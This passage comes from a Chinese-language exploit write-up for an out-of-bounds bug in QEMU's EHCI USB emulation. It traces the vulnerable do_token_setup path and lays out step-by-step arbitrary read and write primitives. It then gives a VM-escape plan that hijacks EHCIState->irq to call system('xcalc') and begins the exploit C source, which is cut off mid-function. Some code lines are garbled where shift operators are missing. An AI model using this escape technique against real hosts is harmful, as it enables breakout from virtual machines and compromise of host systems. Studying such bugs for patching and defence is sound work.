                again = ehci_state_fetchitd(ehci, async);
                itd_count++;
                break;
            case EST_FETCHSITD:
                again = ehci_state_fetchsitd(ehci, async);
                itd_count++;
                break;
            case EST_ADVANCEQUEUE:
                assert(q != NULL);
                again = ehci_state_advqueue(q);
                break;
            case EST_FETCHQTD:
                assert(q != NULL);
                again = ehci_state_fetchqtd(q);
                break;
            case EST_HORIZONTALQH:
                assert(q != NULL);
                again = ehci_state_horizqh(q);
                break;
            case EST_EXECUTE:
                assert(q != NULL);
                again = ehci_state_execute(q);
                if (async) {
                    ehci->async_stepdown = 0;
                }
                break;
            case EST_EXECUTING:
                assert(q != NULL);
                if (async) {
                    ehci->async_stepdown = 0;
                }
                again = ehci_state_executing(q);
                break;
            case EST_WRITEBACK:
                assert(q != NULL);
                again = ehci_state_writeback(q);
                if (!async) {
                    ehci->periodic_sched_active = PERIODIC_ACTIVE;
                }
                break;
            default:
                fprintf(stderr, "Bad state!\n");
                again = -1;
                g_assert_not_reached();
                break;
            }
            if (again  16) {
                /* TODO: notify guest (raise HSE irq?) */
                fprintf(stderr, "processing error - resetting ehci HC\n");
                ehci_reset(ehci);
                again = 0;
            }
        }
        while (again);
    }
现再到了`ehci_state_execute`函数了，从这个函数到`usb_process_one`函数，中间的过程不需要再设置什么其它的内容就可以执行到`usb_process_one`函数了，我们直接来看`usb_process_one`函数，这个函数里面会有一个分支，会根据pid来决定具体是调用`do_token_setup`、`do_token_in`、`do_token_out`这三个函数中的哪一个，pid的值是由qtd->token来决定的，qtd的值是我们可控的，所以说我们就可以指定执行哪个函数
> tips:
>
> 这里有一个坑点，我最开始启动虚拟机的时候没有加一个真实的usb设备，导致执行这个`usb_ep_get(p->queue->dev, p->pid,
> endp);`函数的时候就一直报错，后面加上一个真实的设备之后就可以了 23333
    static void usb_process_one(USBPacket *p)
    {
        USBDevice *dev = p->ep->dev;
        /*
         * Handlers expect status to be initialized to USB_RET_SUCCESS, but it
         * can be USB_RET_NAK here from a previous usb_process_one() call,
         * or USB_RET_ASYNC from going through usb_queue_one().
         */
        p->status = USB_RET_SUCCESS;
        if (p->ep->nr == 0) {
            /* control pipe */
            if (p->parameter) {
                do_parameter(dev, p);
                return;
            }
            switch (p->pid) {
            case USB_TOKEN_SETUP:
                do_token_setup(dev, p);
                break;
            case USB_TOKEN_IN:
                do_token_in(dev, p);
                break;
            case USB_TOKEN_OUT:
                do_token_out(dev, p);
                break;
            default:
                p->status = USB_RET_STALL;
            }
        } else {
            /* data pipe */
            usb_device_handle_data(dev, p);
        }
    }
现再终于可以调用到漏洞函数了，`do_token_setup`函数代码如下，这里有一个检测如果说`iov.size`的值不等于8的话就会直接return，但是还好`iov.size`也是由`qtd->token`来决定的所以说我们就可以绕过这个检测了，然后设置`setup_len`，`setup_buf`的地址是由qtd的`bufptr`来决定的，所以说`setup_len`可控，从而代码漏洞描述中的效果
    static void do_token_setup(USBDevice *s, USBPacket *p)
    {
        int request, value, index;
        if (p->iov.size != 8) {
            p->status = USB_RET_STALL;
            return;
        }
        usb_packet_copy(p, s->setup_buf, p->iov.size);
        s->setup_index = 0;
        p->actual_length = 0;
        s->setup_len   = (s->setup_buf[7] setup_buf[6];
        if (s->setup_len > sizeof(s->data_buf)) {
            fprintf(stderr,
                    "usb_generic_handle_packet: ctrl buffer too small (%d > %zu)\n",
                    s->setup_len, sizeof(s->data_buf));
            p->status = USB_RET_STALL;
            return;
        }
        request = (s->setup_buf[0] setup_buf[1];
        value   = (s->setup_buf[3] setup_buf[2];
        index   = (s->setup_buf[5] setup_buf[4];
        if (s->setup_buf[0] & USB_DIR_IN) {
            usb_device_handle_control(s, p, request, value, index,
                                      s->setup_len, s->data_buf);
            if (p->status == USB_RET_ASYNC) {
                s->setup_state = SETUP_STATE_SETUP;
            }
            if (p->status != USB_RET_SUCCESS) {
                return;
            }
            if (p->actual_length setup_len) {
                s->setup_len = p->actual_length;
            }
            s->setup_state = SETUP_STATE_DATA;
        } else {
            if (s->setup_len == 0)
                s->setup_state = SETUP_STATE_ACK;
            else
                s->setup_state = SETUP_STATE_DATA;
        }
        p->actual_length = 8;
    }
## 任意地址读写
**任意地址读**
  1. 首先设置越界长度为0x1010
  2. 进行越界写，将setup_len 设置成0x1010，将setup_index设置成0xfffffff8-0x1010， 因为usb_packet_copy后面还有s->setup_index += len 操作，此时s->setup_index 就会被设置成0xfffffff8 
        usb_packet_copy(p, s->data_buf + s->setup_index, len);
     s->setup_index += len;
  3. 再次进行越界写，此时从data_buf-8处开始写，覆盖了setup字段，将setup[0] 设置成USB_DIR_IN，并且将setup_index 覆盖成targer_offset-0x1018，因为也要经过s->setup_index += len;操作。并且本次进入case SETUP_STATE_DATA时：len = s->setup_len – s->setup_index操作（0x1010-(-0x8)=0x1018），使得len变成0x1018。在第二次越界写的时候越界写setup_len的值为0xffff这样当我们的setup_index的值设置为负数的时候，在下次越界读的时候len的值会是负数，所以需要使用0xffff让其成为正数 
        case SETUP_STATE_DATA:
            if (s->setup_buf[0] & USB_DIR_IN) {
                int len = s->setup_len - s->setup_index;
                if (len > p->iov.size) {
                    len = p->iov.size;
                }
                usb_packet_copy(p, s->data_buf + s->setup_index, len);
  4. 最后越界读，就能读取目标地址的内容
**任意地址写**
  1. 首先设置越界长度为0x1010
  2. 越界写，将setup_len 设置成目标偏移-0x1010，usb_packet_copy后面的s->setup_index += len 操作后，s->setup_index就变成目标偏移offset。将setup_index设置成目标偏移+0x8， 经过下次越界写的len = s->setup_len – s->setup_index =》len=（offset+0x8）-offset=0x8，只修改目标地址8个字节的内容
  3. 再次越界写，修改目标地址的内容
## 利用思路
  1. 首先越界读，可以读`USBdevice`结构里面`USBEndpoint ep_ctl`，在这个结构体里面会有`USBdevice`的地址，我们可以通过这个地址获取到`data_buf`和`USBPort`
  2. 然后在越界读出来的内容里有一个变量是`USBDescDevice *device`，可以根据这个变量得到system的地址
  3. `USBDevic` 会在 realize 时，调用`usb_claim_port`，将`USBDevice`中的port字段设置为指向  
`EHCIState`中的ports的地址， 读取`USBDevice->port`的内容就能获得`EHCIState->ports` 的地址，减去偏移得到
EHCIState的地址。进而得到EHCIState->irq地址。
  4. 利用任意写将`EHCIState->irq`内容填充为伪造的irq地址，将handler 填充成system[@plt](https://github.com/plt "@plt")地址，opaque填充成payload的地址，之后通过mmio_write读写触发ehci_update_irq -> qemu_set_irq，最终执行system(“xcalc”)，完成利用。
## exp
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    typedef struct USBDevice USBDevice;
    typedef struct USBEndpoint USBEndpoint;
    struct USBEndpoint {
        uint8_t nr;
        uint8_t pid;
        uint8_t type;
        uint8_t ifnum;
        int max_packet_size;
        int max_streams;
        bool pipeline;
        bool halted;
        USBDevice *dev;
        USBEndpoint *fd;
        USBEndpoint *bk;
    };
    struct USBDevice {
        int32_t remote_wakeup;
        int32_t setup_state;
        int32_t setup_len;
        int32_t setup_index;
        USBEndpoint ep_ctl;
        USBEndpoint ep_in[15];
        USBEndpoint ep_out[15];
    };
    typedef struct EHCIqh {
        uint32_t next;                    /* Standard next link pointer */
        /* endpoint characteristics */
        uint32_t epchar;
        /* endpoint capabilities */
        uint32_t epcap;
        uint32_t current_qtd;             /* Standard next link pointer */
        uint32_t next_qtd;                /* Standard next link pointer */
        uint32_t altnext_qtd;         
        uint32_t token;                   /* Same as QTD token */
        uint32_t bufptr[5];               /* Standard buffer pointer */
    } EHCIqh;
    typedef struct EHCIqtd {
        uint32_t next;                    /* Standard next link pointer */
        uint32_t altnext;                 /* Standard next link pointer */
        uint32_t token;
        uint32_t bufptr[5];               /* Standard buffer pointer */
    } EHCIqtd;
    char *setup_buf;
    char *data_buf;
    char *data_bufoob;
    char *first_leak_data;
    char *second_leak_data;
    unsigned char* mmio_mem;
    char *dmabuf;
    uint32_t *entry;
    struct EHCIqh *qh;
    struct EHCIqtd * qtd;
    uint64_t device_addr = 0;
    uint64_t func_addr = 0;
    uint64_t port_addr = 0;
    uint64_t port_ptr = 0;
    uint64_t data_buf_addr = 0;
    size_t virtuak_addr_to_physical_addr(void *addr){
        uint64_t data;
        int fd = open("/proc/self/pagemap",O_RDONLY);
        if(!fd){
            perror("open pagemap");
            return 0;
        }
        size_t pagesize = getpagesize();
        size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);